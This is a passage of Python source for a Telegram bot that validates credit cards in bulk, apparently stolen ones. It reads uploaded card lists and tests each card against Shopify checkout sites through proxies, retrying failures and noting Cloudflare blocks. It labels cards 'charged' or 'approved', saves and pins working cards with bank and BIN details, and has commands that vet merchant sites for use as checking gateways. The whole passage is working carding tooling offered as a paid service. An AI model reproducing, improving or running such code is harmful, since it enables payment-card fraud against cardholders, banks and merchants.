        if not event.reply_to_msg_id: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```")
        
        # Load sites from sites.txt
        if not os.path.exists('sites.txt'):
            return await event.reply("❌ 𝙎𝙞𝙩𝙚𝙨 𝙛𝙞𝙡𝙚 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.")
        
        async with aiofiles.open('sites.txt', 'r') as f:
            sites_content = await f.read()
            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]
        
        if not global_sites:
            return await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙞𝙣 𝙨𝙞𝙩𝙚𝙨.𝙩𝙭𝙩! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.")
        
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_ranfor_cards(event, cards, global_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_ranfor_cards(event, cards, global_sites):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")

    try:
        batch_size = 20
        for i in range(0, len(cards), batch_size):
            if not global_sites:
                await status_msg.edit("❌ **All sites are dead!**\nPlease contact admin to add fresh sites.")
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                try: await status_msg.edit(final_caption, buttons=final_buttons)
                except: pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not global_sites:
                    break
                current_site = random.choice(global_sites)
                tasks.append(check_card_with_retries_ranfor(card, current_site, user_id, global_sites))
                task_cards.append((card, current_site))
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()

                if is_site_dead(response_text):
                    declined += 1
                    # Don't remove sites from global_sites list for /ran command
                    # Sites in sites.txt should remain unchanged
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                status_text_lower = result.get("Status", "").lower()
                
                # Check for charged status
                if "charged" in response_text_lower or "charged" in status_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
��𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
                    result_msg = await event.reply(card_msg)
                    # Pin if charged
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        await pin_charged_message(event, result_msg)
                
                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_ranfor:{user_id}".encode())]
                ]
                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)

        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        try: await status_msg.edit(final_caption, buttons=final_buttons)
        except: pass
    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)

async def check_card_with_retries_ranfor(card, site, user_id, global_sites, max_retries=3):
    """Check a card with automatic retry up to max_retries times on site errors"""
    last_result = None
    
    for attempt in range(max_retries):
        result = await check_card_specific_site(card, site, user_id)
        
        # Check if site is dead
        if is_site_dead(result.get("Response", "")):
            # Don't remove sites from global_sites for /ran command
            # Just try with a new random site
            
            # If no more sites available, return dead
            if not global_sites:
                return {"Response": "All sites dead", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}
            
            # Try with a new random site (without removing the dead one)
            site = random.choice(global_sites)
            last_result = result
            
            # Add a small delay before retry (except on last attempt)
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5)
        else:
            # If no site error, return the result immediately
            return result
    
    # If all attempts failed with site errors, return as dead
    if last_result:
        return {"Response": f"Site errors on all attempts: {last_result.get('Response', 'Unknown')}", "Price": last_result.get('Price', '-'), "Gateway": "Shopify", "Status": "Dead"}
    
    # Fallback (should never reach here)
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "Shopify", "Status": "Dead"}

@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)



@client.on(events.NewMessage(pattern=r'(?i)^[/.]check(?:\s|$)'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        buttons = [
            [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+9prhieUj5lI2NTFl")]
        ]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙧𝙚𝙫𝟯𝙧𝙨𝙚𝙭", buttons=buttons)

    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [
            [Button.inline("🔍 𝘾𝙝𝙚𝙘𝙠 𝙈𝙮 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨", b"check_db_sites")]
        ]

        instruction_text = """🔍 **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**

𝙄𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙨𝙞𝙩𝙚𝙨 𝙩𝙝𝙚𝙣 𝙩𝙮𝙥𝙚:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

𝘼𝙣𝙙 𝙞𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨 𝙖𝙣𝙙 𝙖𝙙𝙙 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 & 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙡𝙞𝙘𝙠 𝙗𝙚𝙡𝙤𝙬 𝙗𝙪𝙩𝙩𝙤𝙣:"""

        return await event.reply(instruction_text, buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!\n\n💡 𝙀𝙭𝙖𝙢𝙥𝙡𝙚:\n`/check`\n`1. https://example.com`\n`2. site2.com`")

    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(f"```⚠️ 𝙁𝙤𝙪𝙣𝙙 {total_sites_found} 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 10 𝙨𝙞𝙩𝙚𝙨```")

    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    """Process site checking in background"""
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await event.reply(f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total_sites} 𝙨𝙞𝙩𝙚𝙨...```")

    batch_size = 10
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=event.sender_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await status_msg.edit(final_text)
                except:
                    await event.reply(final_text)
                return

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)
            dead_count = len(dead_sites)
            
            working_sites_text = ""
            if working_sites:
                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]
                ) + "\n"
            dead_sites_text = ""
            if dead_sites:
                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]
                ) + "\n"

            status_text = (
                f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...\n\n"
                f"📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]\n"
                f"✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}\n"
                f"❌ 𝘿𝙚𝙖𝙙: {dead_count}\n\n"
                f"🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}\n"
                f"📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}\n"
                f"💰 𝙋𝙧𝙞𝙘𝙚: {result['price']}\n"
                f"```\n"
            )
            if working_sites_text or dead_sites_text:
                status_text += working_sites_text + dead_sites_text

            try:
                await status_msg.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}

"""
    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    buttons = []
    if working_sites:
        # Store working sites in temporary dict with user_id as key
        TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]
        buttons.append([Button.inline("➕ 𝘼𝙙𝙙 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝙩𝙤 𝘿𝘽", f"add_working:{event.sender_id}".encode())])

    try:
        await status_msg.edit(final_text, buttons=buttons)
    except:
        await event.reply(final_text, buttons=buttons)

# Button callback handlers
@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])

    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)

    await event.answer("🔍 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    """Check user's DB sites and remove dead ones"""
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(status_text)

    batch_size = 10
    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site, user_id=user_id))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            # Check if proxy is dead - stop checking and notify user
            if result["status"] == "proxy_dead":
                final_text = f"""⚠️ **𝙋𝙧𝙤𝙭𝙮 𝘿𝙚𝙖𝙙!**

{result['response']}

📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 𝘽𝙚𝙛𝙤𝙧𝙚 𝙎𝙩𝙤𝙥:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
📝 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {checked}/{total_sites}"""
                try:
                    await event.edit(final_text)
                except:
                    pass
                return

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}```"""

            try:
                await event.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    if dead_sites:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working_sites
        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙): {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(final_text)
    except:
        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())

        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)

        # Get working sites from temporary storage
        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])
        
        if not working_sites:
            return await event.answer("❌ 𝙉𝙤 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨 𝙛𝙤𝙪𝙣𝙙! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙪𝙣 /𝙘𝙝𝙚𝙘𝙠 𝙖𝙜𝙖𝙞𝙣.", alert=True)

        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []
        already_exists = []

        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added_sites.append(site)
            else:
                already_exists.append(site)

        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)
        
        # Clear temporary storage after adding
        TEMP_WORKING_SITES.pop(callback_user_id, None)

        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"

        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙𝙖𝙩𝙚:**\n{response_text}"

        try:
            await event.edit(updated_text, buttons=None)
        except:
            await event.respond(response_text)

    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
